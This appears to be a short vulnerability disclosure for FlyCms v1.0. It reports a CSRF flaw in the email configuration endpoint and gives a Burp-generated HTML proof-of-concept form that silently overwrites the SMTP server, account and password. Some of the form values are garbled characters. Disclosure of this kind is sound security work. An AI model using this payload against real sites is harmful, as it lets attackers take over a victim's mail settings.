target:https://github.com/sunkaifei/FlyCms
version: v1.0

FlyCms v1.0 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /system/email/email_conf_updagte

![1](https://github.com/mafangqian/cms/assets/84766362/23f6eb6c-f75b-465d-af7d-e24e71ccb18f)


Poc:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.247.192/system/email/email_conf_updagte" method="POST">
      <input type="hidden" name="fly_smtp_server" value="smtp&#46;qq&#46;com" />
      <input type="hidden" name="fly_smtp_usermail" value="�&#130;&#174;�&#174;&#177;�&#156;&#137;�&#136;&#183;�&#144;&#141;" />
      <input type="hidden" name="fly_smtp_password" value="�&#130;&#174;�&#187;&#182;�&#156;&#141;�&#138;&#161;�&#153;&#168;�&#175;&#134;�&#160;&#129;" />
      <input type="hidden" name="fly_smtp_port" value="465" />
      <input type="hidden" name="test_address" value="" />
      <input type="submit" value="Submit request" />a
    </form>
  </body>
</html>
```

![1](https://github.com/mafangqian/cms/assets/84766362/8a8592d8-b592-4989-bf74-6ecc48bd45f1)


Successed

![3](https://github.com/mafangqian/cms/assets/84766362/d8bc7fea-440f-4b7a-846b-e9a595177780)
